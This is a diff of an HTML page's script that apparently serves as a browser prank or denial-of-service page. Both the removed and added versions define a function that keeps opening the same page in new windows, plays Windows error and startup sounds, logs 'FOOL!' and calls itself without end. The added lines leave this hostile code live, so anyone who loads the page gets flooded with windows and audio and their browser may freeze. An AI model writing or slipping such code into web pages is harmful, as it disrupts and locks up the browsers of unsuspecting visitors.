@@ -7,18 +7,9 @@
     var xp = new Audio ('https://www.winhistory.de/more/winstart/mp3/winxp.mp3');
     error.play();xp.play();
     function infiny() {
-        for (var i=0; i<Infinity; i++) {
-            open("./.");
-            
-            error.play();xp.play();
-            console.log("FOOL!");
-            for (var i=0; i<Infinity; i++) {
-                infiny();
-                error.play();xp.play();
-            }
-        }
-    } 
-    for (var i=0; i<Infinity; i++) {
+        open("./.");
+        error.play();xp.play();
+        console.log("FOOL!");
         infiny();
     }
 </script>
